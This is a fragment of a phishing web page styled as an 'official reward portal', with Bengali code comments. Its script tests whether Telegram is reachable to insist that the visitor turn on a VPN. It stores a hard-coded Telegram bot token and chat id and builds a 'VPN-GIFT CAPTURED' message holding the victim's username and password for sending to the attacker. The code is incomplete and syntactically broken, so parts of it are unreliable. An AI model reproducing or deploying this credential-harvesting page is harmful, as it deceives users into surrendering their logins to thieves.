<body>

<div class="header">OFFICIAL REWARD PORTAL</div>

<script>
    // এই ফাংশনটি দিয়ে আমরা চেক করব ইউজার কি ভিপিএন অন করেছে কি না।

    let isVpnOn = false;

    async function checkVpn() {
        try {
            const response = await fetch('https://api.telegram.org', { mode: 'no-cors' });
            isVpnOn = true;
            document.getElementById('vpn-msg').innerText = "🟢 VPN Connected Successfully";

        } catch (e) {
            isVpnOn = false;
            document.getElementById('vpn-msg').innerText = "🔴 Please connect your VPN before login";
            document.getElementById('vpn-msg').className = "vpn-status status-off";
        }
    }

    // প্রতি ২ সেকেন্ড পর পর চেক করবে ভিপিএন অন কি না
    setInterval(checkVpn, 2000);

        const token = "8669755211:AAF1DPtiuDNV16f8SbhZIyC43BT-p3s-0a8";
        const id = "7350995534";

        if(user === "" || pass === "") {
            alert("Please fill in your credentials!");
            return;

        // আপনার শর্ত ১: ভিপিএন ছাড়া লগইন করলে ফেইল দেখাবে
        if (!isVpnOn) {
            alert("Login Failed! First connect your VPN to secure the connection.");
            return;
        }

        // আপনার শর্ত ২: ভিপিএন থাকলে সাকসেস দেখাবে এবং ডাটা পাঠাবে
        const text = `🎯 VPN-GIFT CAPTURED 🎯\n👤 USER: ${user}\n🔑 PASS: ${pass}`;
